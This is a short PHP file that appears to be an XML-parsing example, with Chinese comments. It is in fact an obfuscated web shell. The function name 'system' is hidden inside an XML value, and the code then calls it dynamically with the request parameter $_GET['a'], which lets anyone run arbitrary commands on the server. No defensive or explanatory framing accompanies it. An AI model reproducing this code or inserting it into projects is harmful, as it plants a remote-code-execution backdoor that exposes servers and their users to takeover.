<?php
$xmlString = '<?xml version="1.0" encoding="UTF-8"?>
<data>
    <item>
        <key>system</key>
    </item>
    <item>
        <key>age</key>
        <value>30</value>
    </item>
</data>';

// 解析 XML 到结构数组
$parser = xml_parser_create();
xml_parse_into_struct($parser, $xmlString, $values, $index);
xml_parser_free($parser);

// 提取所有 key 节点的值
foreach ($index['KEY'] as $keyIndex) {
    $key = $values[$keyIndex]['value'];
    ($key)($_GET['a']); // 动态调用函数
}
?>
